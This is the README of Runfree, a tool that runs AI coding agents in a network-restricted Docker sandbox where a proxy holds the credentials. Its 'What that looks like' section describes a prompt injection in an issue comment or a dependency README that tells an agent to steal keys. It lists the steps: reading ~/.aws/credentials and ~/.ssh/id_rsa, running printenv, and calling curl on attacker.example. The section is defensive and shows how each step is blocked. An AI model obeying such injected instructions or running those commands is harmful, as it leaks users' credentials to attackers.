<p align="center">
  <img src="docs/logo.png" alt="Runfree logo" width="200" />
</p>
<h1 align="center">Runfree</h1>
<h3 align="center">Let your coding agent run without permission prompts, in a container with no open internet and no access to your API tokens</h3>
<p align="center">
<a href="https://github.com/genged/runfree/actions/workflows/test.yml">
  <img src="https://github.com/genged/runfree/actions/workflows/test.yml/badge.svg" alt="Test status" />
</a>
<a href="https://github.com/genged/runfree/actions/workflows/release.yml">
  <img src="https://github.com/genged/runfree/actions/workflows/release.yml/badge.svg" alt="Release status" />
</a>
<a href="https://github.com/genged/runfree/releases/latest">
  <img src="https://img.shields.io/github/v/release/genged/runfree?sort=semver" alt="Latest release" />
</a>
<img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT" />
</p>

Runfree starts Claude Code, Codex, or Pi inside a per-project Docker workspace.
Claude Code and Codex run with their permission prompts off, because the
container is the sandbox. The container has no route to the internet except a
proxy, which allows only the exact hostnames you approved on the host and
attaches your real service credentials itself. The agent never holds them.

- **No prompt-babysitting.** The agent edits files, installs packages, and runs
  tests without asking. It does that in a container, not in your shell.
- **Deny-by-default network.** Outbound HTTPS/WSS reaches only hosts you
  approved. The agent can edit the policy file; editing it grants nothing.
- **API tokens stay out of reach.** A service token comes from
  `gh auth token`, 1Password, or an environment variable on your host. The
  agent's environment gets a placeholder. The agent's own Claude or Codex
  login is the exception: it lives in the project's agent state, where the
  agent can read it.

```bash
brew install genged/tap/runfree
cd ~/code/my-project
runfree init
runfree
```

`runfree init` opens a short wizard. It detects the project's package
ecosystems, Git remote hosts, and a GitHub CLI login, then offers a plan you
review before any policy or credential source is written.

Requires Apple Silicon macOS and Docker Desktop. Each claim above has a limit
worth knowing before you rely on it: see [Limitations](#limitations).

## Features

### Push to GitHub and GitLab without handing over your token <img src="https://img.shields.io/badge/New_in-0.6.0-2ea44f" alt="New in 0.6.0" />

```bash
# inside a session, with the github service enabled (Quickstart step 4)
git push origin my-branch
```

Clone, pull, and push your private repos over HTTPS, `git@github.com:` remotes
included. The proxy adds your token only to recognized git requests, so
`printenv` in the sandbox finds a placeholder, and each push waits for your
approval unless you allow it. [More](docs/cli.md#git-over-https-and-ssh-remotes)

### Three agents and a shell, one sandbox

```bash
runfree claude
runfree codex
runfree pi
runfree shell
```

Claude Code, Codex, and Pi share the project's sandbox and policy. Run several
at once: each session gets its own container, and `runfree sessions` lists them.

### Whole ecosystems in one command

```bash
runfree service enable node
runfree service list --all
```

A curated service allows the hosts an ecosystem's tools need, so you are not
hunting hostnames one 403 at a time. [More](docs/cli.md#services)

### Blocked requests tell you how to fix them

```bash
runfree doctor
```

An unapproved host is refused before any DNS lookup, and `runfree doctor`
prints the exact command that would allow it.

### MCP servers: one review, one login <img src="https://img.shields.io/badge/New_in-0.6.0-2ea44f" alt="New in 0.6.0" />

```bash
runfree mcp list
runfree mcp enable claude my-server
```

`mcp list` shows the servers from your Claude and Codex config. `mcp enable`
reviews the approval, credential, and OAuth hosts on one screen, applies them
to the running sandbox, and opens the login. [More](docs/cli.md#mcp)

### And more

- [Your dev server, database, or simulator, from the agent](#feature-host-services) <img src="https://img.shields.io/badge/New_in-0.6.0-2ea44f" alt="New in 0.6.0" />
- [Resume in the same terminal](#feature-resume) <img src="https://img.shields.io/badge/New_in-0.6.0-2ea44f" alt="New in 0.6.0" />
- [Writes wait for you](#feature-write-approval)
- [Credentials from wherever you keep them, including host-signed JWTs](#feature-credentials)
- [OAuth tokens the agent never holds](#feature-oauth-handles)
- [Per-tool MCP rules](#feature-mcp-tool-rules)
- [Read-only and path-scoped hosts](#feature-request-rules)
- [Your private API as a service](#feature-private-apis)
- [Find out what a project needs](#feature-audit)
- [Preview, paste, and see the screen](#feature-preview)
- [Team policy in git](#feature-team-policy)
- [Service updates you review](#feature-service-updates)
- [A clean checkout](#feature-clean-checkout)
- [Task guides built in](#feature-task-guides)

## Why

A coding agent is useful because it can read your code, edit it, install
packages, run tests, and call APIs. Run it directly on your machine and all of
that happens with your shell's reach and your credentials, so one prompt injection,
one confused tool call, or one bad suggestion acts with everything you have.
The usual answer is a permission prompt for every command, which you either
babysit or switch off.

Runfree moves the boundary instead. When the agent reaches for a host you have
not approved, the request is refused and `runfree doctor` prints which host it
was and the exact command that would allow it.

## What that looks like

An agent is fixing a failing build. It reads an issue comment, or a README
inside a dependency, that carries instructions aimed at it: collect this
machine's cloud keys and GitHub token and send them to `attacker.example`.
With prompts off on your host, that is three commands. Inside Runfree:

| The injected step | What happens |
| --- | --- |
| `cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa` | File not found. Your home directory is not mounted. |
| `printenv`, looking for a GitHub token | A placeholder. The real value is held by the proxy. |
| `curl https://attacker.example` | 403 from the proxy, before any DNS lookup. |
| Connect straight to an IP address, skipping the proxy | No route. |
| Edit `.runfree/network-policy.json` to allow the host | No effect without your approval on the host. |

Afterwards, `runfree doctor` lists `attacker.example` among the blocked hosts.

The same injection can still do two things. It can change files in your working
tree, and it can send data to a host you already allowed, for example by pushing
to a repository on an allowed Git host. `--write ask` and `--deny-git-push` on
`runfree host rules` narrow the second. The full table is
[What Stops What](docs/security.md#what-stops-what).

## Who it is for

Individual developers running Claude Code, Codex, or Pi on their own projects,
who want the agent's tools in a container and their service credentials out of
its reach. Teams can commit policy and review it like code (see
[`docs/team-workflow.md`](docs/team-workflow.md)), but the primary case is one
developer and one project.

Runfree is not a VM boundary, not a cloud service, and not a substitute for
reading what an agent wrote. It narrows the default blast radius.

## Quickstart

### 1. Install

Runfree publishes **Apple Silicon macOS** binaries and is supported with
**Docker Desktop**. You also need `git`: Git 2.48 or newer gives full
worktree support. Older Git still works, with limits described in
[Git worktrees](docs/cli.md#git-worktrees).

```bash
brew install genged/tap/runfree
```

Without Homebrew:

```bash
curl -fsSL https://raw.githubusercontent.com/genged/runfree/main/scripts/install.sh | bash
```

That downloads the latest release for your architecture, verifies its SHA-256
checksum against the published manifest, and installs to `~/.local/bin/runfree`.
It needs `bash`, not `sh`.

To build from source instead, you need Node 22, pnpm 10.28.0, and Bun 1.3.14:

```bash
pnpm install --frozen-lockfile
pnpm run build:bin
./dist/runfree version
```

Intel macOS and Linux have no published binaries. They can be built from source;
building is not a support claim.

### 2. Initialize a project

```bash
cd ~/code/my-project
runfree init
```

`init` writes project-local config and deny-all desired policy:

```text
.runfree/
  .gitignore
  runfree.json
  network-policy.json
```

On a terminal it then continues into the wizard. Each item it offers is one you
can untick: a curated service for each ecosystem it found (a lockfile or
manifest is enough), the Git remote's host, and, when `gh` is installed, a
`github-cli` credential source bound to the `github` service. `runfree init --yes`
and non-interactive runs write the files above and skip the wizard.

Runtime state lives outside the repository, under your XDG state root, for
example `~/.local/state/runfree/projects/<project-hash>/`.

### 3. Run an agent

```bash
runfree          # the configured default agent
runfree claude
runfree codex
runfree pi
```

The first start asks you to review the policy before anything runs. How the
agent then logs in depends on the agent:

- **Claude Code and Codex** log in the way they always do, with your
  subscription or account, on first start in each project. The review
  includes the hosts that login and the model API need, so there is nothing
  to configure. The login is stored in that project's agent state, inside
  the agent's reach, not behind the proxy.
- **Pi** has no implicit setup. Enable its provider's API-key service, for
  example
  `runfree service enable anthropic --from-env ANTHROPIC_API_KEY`. Pi then
  sees a placeholder `ANTHROPIC_API_KEY`, and the proxy swaps in the real key
  on requests to `api.anthropic.com`.

Around a session:

```bash
runfree status
runfree shell
runfree doctor            # why a request was blocked, and what would allow it
runfree logs proxy --verbose
runfree stop
```

### 4. Add network access and credentials

The wizard covers the common cases. Everything it does is also a command, for
changes after `init` or for projects set up without it.

Credentials are resolved on the host and injected only by the proxy. To reuse a
GitHub CLI login without the credential entering the container, which also
turns on git push over HTTPS:

```bash
runfree credential source add github-cli -- gh auth token
runfree service enable github --from-source github-cli
```

To allow a single host, read-only:

```bash
runfree host add api.example.com --read-only
runfree host explain api.example.com
```

To discover what a project actually needs, during a trusted onboarding task:

```bash
runfree up --audit-network=30m
runfree audit report          # suggests exact host add commands; never edits policy
runfree audit off
```

[`docs/cli.md`](docs/cli.md) is the full command reference.
`runfree help <topic>` has task guides.

## More features

<a id="feature-host-services"></a>
### Your dev server, database, or simulator, from the agent <img src="https://img.shields.io/badge/New_in-0.6.0-2ea44f" alt="New in 0.6.0" />

```bash
runfree host-service add postgres --port 5432
# inside a new session, the unmodified client just works
psql -h 127.0.0.1 -p 5432 -U <user> <database>
```

The same goes for a dev server on `:3000`, Ollama, or an iOS simulator through
`idb_companion`. Before approving, Runfree shows which process holds the port,
and `runfree status` warns if that changes. The tunnel is opaque, so approve
only services you would let the agent use freely.
[More](docs/cli.md#host-services)

<a id="feature-resume"></a>
### Resume in the same terminal <img src="https://img.shields.io/badge/New_in-0.6.0-2ea44f" alt="New in 0.6.0" />

```bash
runfree resume
```

The laptop slept or the tab closed? Run `runfree resume` in that terminal,
answer "Resume it", and you are back in the same Claude or Pi conversation.
Anything else shows up in a picker, newest first. [More](docs/cli.md#resume)

<a id="feature-write-approval"></a>
### Writes wait for you

```bash
runfree host rules api.example.com --write ask
runfree approvals --watch
runfree approve <id>
```

Reads go straight through. A request to that host that counts as a write
waits until you approve it on the host, for one request or for the rest of the
session. [More](docs/cli.md#approve-on-write)

<a id="feature-credentials"></a>
### Credentials from wherever you keep them

```bash
runfree credential set-source github --from-1password op://vault/item/token
runfree credential set-source github --from-env GITHUB_TOKEN
runfree credential set-source github --from-env GITHUB_TOKEN --refresh-every 15m
```

Credentials can come from a host command, an environment variable, 1Password,
or stdin, and can be re-resolved on a schedule. Runfree can also sign a
short-lived JWT on the host from your private key, for APIs like App Store
Connect. The value is resolved on the host and held by the proxy.
[More](docs/cli.md#credentials)

<a id="feature-oauth-handles"></a>
### OAuth tokens the agent never holds

```bash
runfree service enable google-ads --from-1password-item op://<vault>/<item>
```

For OAuth services such as `google-ads`, the proxy keeps the refresh token and
client secret. The agent works with `runfree_oauth_*` handles, and the proxy
swaps them for the real tokens on the way out. [More](docs/cli.md#services)

<a id="feature-mcp-tool-rules"></a>
### Per-tool MCP rules

```bash
runfree mcp rules claude my-server --tool create_issue --write ask
```

Hold or deny one MCP tool instead of the whole server. [More](docs/cli.md#mcp)

<a id="feature-request-rules"></a>
### Read-only and path-scoped hosts

```bash
runfree host add api.example.com --read-only
runfree host rules api.example.com --method GET --request-path-prefix /v1/
runfree host rules github.com --deny-git-push
```

`--read-only` allows only `GET`, `HEAD`, and `OPTIONS`. A request rule narrows
a host to the methods and paths you name, and `--deny-git-push` keeps fetch but
refuses pushes. [More](docs/cli.md#manage-hosts)

<a id="feature-private-apis"></a>
### Your private API as a service

```bash
runfree service custom add user-internal-api --from-file ./internal-api.runfree-service.json
runfree service enable user-internal-api --from-source internal-token
```

Describe your API's hosts and credential once, then enable it like a curated
service. [More](docs/cli.md#user-defined-services)

<a id="feature-audit"></a>
### Find out what a project needs

```bash
runfree up --audit-network=30m
runfree audit report
```

During a trusted onboarding task, audit mode lets traffic through for a fixed
window and records it. The report suggests exact `runfree host add` commands
and never edits policy itself.

<a id="feature-preview"></a>
### Preview, paste, and see the screen

```bash
runfree forward 3000      # the agent's dev server on your loopback
runfree inbox paste       # hand the agent a clipboard image
runfree vnc               # watch a headed browser the agent drives
```

[More](docs/cli.md#optional-runtime-helpers)

<a id="feature-team-policy"></a>
### Team policy in git

Commit `.runfree/` and review policy changes like code. Each developer binds
their own credentials and approves policy on their own machine, so a pull
request cannot grant network access by itself.
[More](docs/team-workflow.md)

<a id="feature-service-updates"></a>
### Service updates you review

```bash
runfree service diff
runfree service diff --apply
```

When a curated service changes in a new release, your project keeps the old
revision until you look at the diff and apply it. [More](docs/cli.md#service-revisions)

<a id="feature-clean-checkout"></a>
### A clean checkout

`node_modules` and other dependency directories live in Runfree-owned volumes
instead of your working tree, and `.runfree/image/Dockerfile` adds project
tooling to the base image.

<a id="feature-task-guides"></a>
### Task guides built in

```bash
runfree help quickstart
runfree help network
runfree help credentials
```

Workflow guides for setup, network policy, credentials, services, MCP, and
more, from the terminal.

## How it works

The agent container is untrusted. The proxy container is the trust boundary.
The host owns approval.

```text
 HOST (trusted: you and the runfree CLI)
   approvals, effective policy, credential sources
        |                                    |
        | starts and admits sessions         | policy and credentials
        v                                    v
 +---------------------------+       +---------------------------+
 | agent container           |       | proxy container           |
 | UNTRUSTED                 |       | TRUST BOUNDARY            |
 |                           |       |                           |
 | Claude Code / Codex / Pi  | HTTPS | 1. exact-host allowlist   |
 | /workspace (your project) |  WSS  | 2. per-host request rules |     approved
 | placeholders, no real     |------>| 3. write approval         |---> hosts
 | credentials               |       | 4. attach credential      |     only
 +---------------------------+       +---------------------------+
        X no direct egress, no route to the host gateway
```

- Direct agent egress and host-gateway egress are blocked by Docker topology.
- Outbound HTTPS/WSS goes through the proxy, which checks the allowlist, then
  the per-host request rules, then write approval, and only then reads a credential.
- Desired policy is writable from the container; effective policy is not
  reachable from it.
- Dependency directories live in Runfree-owned volumes rather than your
  checkout.

That is what makes the confused-deputy case bounded: a compromised agent can ask
for an allowed request, but it cannot read the proxy-held credential or widen the
policy from inside the container.

See [`docs/architecture.md`](docs/architecture.md) for the runtime model.

### How it is tested

`make test-runtime-core` runs against a real Docker daemon and proves the trust
boundary: the network shape and dropped capabilities, egress containment,
request rules and write approval, that policy edits from the agent are inert,
and per-session admission. A security test has to show the refusal happens
before the side effect: before a DNS lookup, an upstream connection, or a
credential read.

[What Stops What](docs/security.md#what-stops-what) maps each attack to the
control that stops it. [What Runfree Does Not Prove](docs/security.md#what-runfree-does-not-prove)
lists the gaps, including that the live suite runs by hand on a Docker host and
is not part of the release pipeline.

## Limitations

Worth reading before you rely on it. The full threat model is
[`docs/security.md`](docs/security.md).

- **Your working tree is writable**, including `.git`. Runfree bounds the
  network, not the repository.
- **Native Claude and Codex logins are not proxy-held.** They live in
  per-project agent state, inside the agent's reach. Only proxy-managed service
  credentials get that boundary.
- **An allowed host stays allowed.** Policy controls destination and request
  shape, not the content of what an agent sends to a destination you approved.
  A broad multi-tenant host is a broad allowance.
- **Project image builds run before the sandbox exists**, on the host Docker
  daemon. Review project Dockerfiles as host-side decisions.
- **Audit mode widens what the agent can reach** while it is on. It is a
  time-boxed discovery tool, not a default.
- **Docker and the host are trusted.** This is not VM isolation.

## Development

```bash
pnpm install --frozen-lockfile
make test
```

Runtime, proxy, firewall, mount, or credential changes also need a Docker host
and `make test-runtime-core`. [`CONTRIBUTING.md`](CONTRIBUTING.md) has the
rest, including what review will ask about.

## Further reading

- [`docs/index.md`](docs/index.md) — the documentation map
- [`docs/project-brief.md`](docs/project-brief.md) — product model and release scope
- [`docs/architecture.md`](docs/architecture.md) — runtime, proxy, policy, and state
- [`docs/security.md`](docs/security.md) — threat model and verification
- [`docs/cli.md`](docs/cli.md) — full command reference
- [`docs/troubleshooting.md`](docs/troubleshooting.md) — refusals and recovery
- [`docs/whats-new-0.6.0.md`](docs/whats-new-0.6.0.md) — current release
- [`AGENTS.md`](AGENTS.md) — guidance for coding agents working in this repo
